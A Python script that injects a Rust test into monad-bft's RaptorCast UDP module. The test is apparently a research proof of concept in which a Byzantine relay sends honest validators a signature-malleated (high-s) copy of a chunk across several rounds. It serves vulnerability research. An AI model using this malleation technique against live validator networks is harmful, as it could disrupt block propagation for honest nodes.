from __future__ import annotations

from pathlib import Path

TARGET = Path("monad-bft/monad-raptorcast/src/udp.rs")
MARKER = "research_malicious_relay_repeats_high_s_alias_across_honest_rounds"

TEST_CODE = r'''

    fn research_sustained_sub_be_32_high_s(a: &[u8; 32], b: &[u8; 32]) -> [u8; 32] {
        let mut out = [0u8; 32];
        let mut borrow = 0u16;
        for i in (0..32).rev() {
            let ai = a[i] as u16;
            let bi = b[i] as u16 + borrow;
            if ai >= bi {
                out[i] = (ai - bi) as u8;
                borrow = 0;
            } else {
                out[i] = (ai + 256 - bi) as u8;
                borrow = 1;
            }
        }
        assert_eq!(borrow, 0);
        out
    }

    fn research_sustained_malleate_signature(payload: &bytes::Bytes) -> bytes::Bytes {
        use bytes::BytesMut;

        let mut out = BytesMut::from(payload.as_ref());
        assert!(out.len() >= crate::SIGNATURE_SIZE);
        let mut low_s = [0u8; 32];
        low_s.copy_from_slice(&out[32..64]);
        let high_s = research_sustained_sub_be_32_high_s(
            &[
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe,
                0xba, 0xae, 0xdc, 0xe6, 0xaf, 0x48, 0xa0, 0x3b,
                0xbf, 0xd2, 0x5e, 0x8c, 0xd0, 0x36, 0x41, 0x41,
            ],
            &low_s,
        );
        out[32..64].copy_from_slice(&high_s);
        out[64] ^= 1;
        out.freeze()
    }

    #[test]
    fn research_malicious_relay_repeats_high_s_alias_across_honest_rounds() {
        use std::{
            collections::BTreeMap,
            net::{IpAddr, Ipv4Addr, SocketAddr},
        };

        use monad_crypto::{
            certificate_signature::{CertificateKeyPair, PubKey as _},
            hasher::{Hasher, HasherType},
        };
        use monad_secp::{KeyPair, SecpSignature};
        use monad_types::{Epoch, NodeId, Round, Stake};
        use monad_validator::validator_set::ValidatorSet;

        use crate::{
            auth::AuthRecvMsg,
            packet::{deterministic::PrimaryEncoding, MessageBuilder},
            util::{
                BuildTarget, EncodingScheme, FullNodeGroupMap, PrimaryBroadcastGroup,
                Redundancy, StubProposerSchedule,
            },
            v1_rollout::DeterministicProtocolRolloutStage,
        };

        fn key(seed: u8) -> KeyPair {
            let mut hasher = HasherType::new();
            hasher.update([seed]);
            let mut bytes = hasher.hash().0;
            KeyPair::from_bytes(&mut bytes).expect("valid deterministic key")
        }

        let byzantine_key = key(1);
        let honest_one_key = key(2);
        let honest_two_key = key(3);
        let honest_three_key = key(4);

        let byzantine = NodeId::new(byzantine_key.pubkey());
        let honest_one = NodeId::new(honest_one_key.pubkey());
        let honest_two = NodeId::new(honest_two_key.pubkey());
        let honest_three = NodeId::new(honest_three_key.pubkey());
        let honest_ids = [honest_one, honest_two, honest_three];
        let honest_keys = [&honest_one_key, &honest_two_key, &honest_three_key];

        let epoch = Epoch(1);
        let validators = ValidatorSet::new_unchecked(
            [
                (byzantine, Stake::ONE),
                (honest_one, Stake::ONE),
                (honest_two, Stake::ONE),
                (honest_three, Stake::ONE),
            ]
            .into(),
        );
        let validator_map: BTreeMap<_, _> = [(epoch, validators)].into();

        let mut states = [
            UdpState::<SecpSignature>::new(honest_one, u64::MAX, 10_000),
            UdpState::<SecpSignature>::new(honest_two, u64::MAX, 10_000),
            UdpState::<SecpSignature>::new(honest_three, u64::MAX, 10_000),
        ];
        for state in &mut states {
            state.set_v1_rollout(DeterministicProtocolRolloutStage::AcceptBothPublishV0);
        }

        let feed = |
            state: &mut UdpState<SecpSignature>,
            payload: bytes::Bytes,
            stride: usize,
            sender: NodeId<monad_secp::PubKey>,
        | {
            state.handle_message(
                &validator_map,
                &FullNodeGroupMap::default(),
                &StubProposerSchedule::VALID,
                |_, _, _| {},
                AuthRecvMsg {
                    src_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 9000),
                    payload,
                    stride: u16::try_from(stride).unwrap(),
                    sender: Some(sender),
                },
            )
        };

        for offset in 0u64..12 {
            let round = Round(42 + offset);
            let proposer_index = usize::try_from(offset % 3).unwrap();
            let proposer_id = honest_ids[proposer_index];
            let proposer_key = honest_keys[proposer_index];
            let victims: Vec<usize> = (0usize..3).filter(|idx| *idx != proposer_index).collect();
            let timestamp = 1_700_000_000_000u64 + offset * 4_096;
            let message = vec![u8::try_from(0x40 + offset).unwrap(); 128 * 1024];

            for state in &mut states {
                state.update_current_round(round);
            }

            let build_group =
                PrimaryBroadcastGroup::of_epoch(epoch, &proposer_id, &validator_map).unwrap();
            let packets = MessageBuilder::<SecpSignature>::new(proposer_key)
                .unix_ts_ms(timestamp)
                .redundancy(Redundancy::from_u8(2))
                .build_vec(
                    &message,
                    &BuildTarget::deterministic_raptorcast(build_group, round),
                )
                .expect("deterministic V1 message builds");
            assert!(packets.len() > 2);

            let assignment_group =
                PrimaryBroadcastGroup::of_epoch(epoch, &proposer_id, &validator_map).unwrap();
            let encoding = PrimaryEncoding::new(
                EncodingScheme::Deterministic25(round),
                &assignment_group,
                message.len(),
                timestamp,
            )
            .expect("primary deterministic encoding builds");
            let assignment = encoding.make_assignment().expect("assignment builds");
            let poison_index = (0usize..assignment.num_chunks())
                .find(|chunk_id| {
                    assignment
                        .resolve_chunk_id(*chunk_id)
                        .is_some_and(|routing| routing.recipient() == &byzantine)
                })
                .expect("Byzantine validator receives at least one first-hop chunk");
            let alias = research_sustained_malleate_signature(&packets[poison_index].payload);

            for victim in &victims {
                let delivered = feed(
                    &mut states[*victim],
                    alias.clone(),
                    packets[poison_index].stride,
                    byzantine,
                );
                assert_eq!(delivered.len(), 0, "one chunk cannot decode the message");
            }

            let mut counts = [0usize; 3];
            for packet in &packets {
                counts[0] += feed(
                    &mut states[0],
                    packet.payload.clone(),
                    packet.stride,
                    proposer_id,
                )
                .len();
                counts[1] += feed(
                    &mut states[1],
                    packet.payload.clone(),
                    packet.stride,
                    proposer_id,
                )
                .len();
                counts[2] += feed(
                    &mut states[2],
                    packet.payload.clone(),
                    packet.stride,
                    proposer_id,
                )
                .len();
            }

            eprintln!(
                "MARKER_SUSTAINED_ROUND_{}_PROPOSER={}_COUNTS={},{},{}",
                round.0, proposer_index, counts[0], counts[1], counts[2]
            );
            assert_eq!(counts[proposer_index], 1, "clean proposer-side receiver decodes");
        }
        eprintln!("MARKER_SUSTAINED_TEST_COMPLETE=1");
    }
'''

text = TARGET.read_text()
if MARKER in text:
    raise SystemExit(f"test already present in {TARGET}")
insert_at = text.rfind("\n}")
if insert_at < 0:
    raise SystemExit(f"could not locate final module brace in {TARGET}")
TARGET.write_text(text[:insert_at] + TEST_CODE + text[insert_at:])
print(f"Injected {MARKER} into {TARGET}")
